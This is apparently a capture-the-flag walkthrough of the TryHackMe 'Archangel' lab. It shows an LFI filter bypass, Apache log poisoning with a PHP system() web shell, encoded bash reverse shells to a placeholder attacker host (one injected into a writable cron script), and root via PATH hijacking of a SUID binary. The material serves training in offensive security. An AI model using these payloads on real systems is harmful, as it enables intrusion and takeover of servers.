---
tags:
  - THM
  - Linux
  - Easy
  - LFI
  - RCE
  - Cron
  - SUID
  - PATH-HJ
---
https://tryhackme.com/room/archangel/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.201.67.26 archangel.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC archangel.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The website is just a simple HTML template.
# Enumeration
Found domain `mafialive.thm`:
```console
$ whatweb http://archangel.thm

http://archangel.thm [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[support@mafialive.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.201.67.26], JQuery, Script, Title[Wavefire]
```
Modify the `/etc/hosts` file:
```text
10.201.67.26 archangel.thm mafialive.thm
```
The new domain contains a website under development. Found **flag1**:
```bash
curl -s http://mafialive.thm/
```
Discovered `/test.php`, which includes another PHP file:
```console
$ gobuster dir -q -r -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://mafialive.thm/ -x php,txt -t 50
/.hta.txt             (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 59]
/robots.txt           (Status: 200) [Size: 34]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 286]

$ curl -s http://mafialive.thm/test.php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
            </div>
</body>

</html>
```
# Exploitation
The server has some protection filters against **LFI**. By making some tests using [Caido](https://caido.io/), we get to the conclusion that the `/test.php?view=` parameter:
- Must contain `/var/www/html/development_testing`
- Can not contain `../..` but can contain `..`

So, we craft a valid URL to show the `/etc/passwd`:
```console
$ curl -s 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd'

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
    </div>
</body>

</html>
```
If we target the `/var/log/apache2/access.log` file, we realize that we can read it. So, we make a malicious request, injecting PHP code in the logs:
```bash
curl -s 'http://mafialive.thm/test.php?view=' -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Get a reverse shell connection:
```console
$ payload="echo -n $(echo -n 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1' | base64) | base64 -d | bash"

$ payload=$(urlencode <<< $payload)

$ curl -s "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log&cmd=$payload"
```
Get **flag2**:
```bash
cat /var/www/html/development_testing/test.php
```
# Post-Exploitation
## User migration
Found **user archangel**:
```console
$ grep 'sh$' /etc/passwd

root:x:0:0:root:/root:/bin/bash
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```
Found a crontab run by **archangel**:
```console
$ grep -v '^#' /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/1 *   * * *   archangel /opt/helloworld.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
We are able to modify the `/opt/helloworld.sh` executable:
```console
$ ls -l /opt/helloworld.sh
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
```
Modify the content of `/opt/helloworld.sh` using `vi` since `nano` is not installed:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Get the **user flag**:
```bash
cat /home/archangel/user.txt
```
## Privilege escalation
Found **SUID binary** in one of the home directories:
```console
$ ls -l /home/archangel/secret/backup

-rwsr-xr-x 1 root root 16904 Nov 18  2020 /home/archangel/secret/backup
```
The binary is running `cp` without full path:
```console
$ strings /home/archangel/secret/backup | grep -vE '^\.|^_'

/lib64/ld-linux-x86-64.so.2
setuid
system
setgid
libc.so.6
GLIBC_2.2.5
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
crtstuff.c
deregister_tm_clones
completed.0
frame_dummy
backup.c
system@@GLIBC_2.2.5
main
setgid@@GLIBC_2.2.5
setuid@@GLIBC_2.2.5
```
We do a **PATH hijacking**:
```console
$ cd /home/archangel/secret/

$ echo '/bin/bash -p' > cp

$ chmod +x cp

$ export PATH="$(pwd):$PATH"

$ ./backup
```
Get the **root flag**:
```bash
cat /root/root.txt
```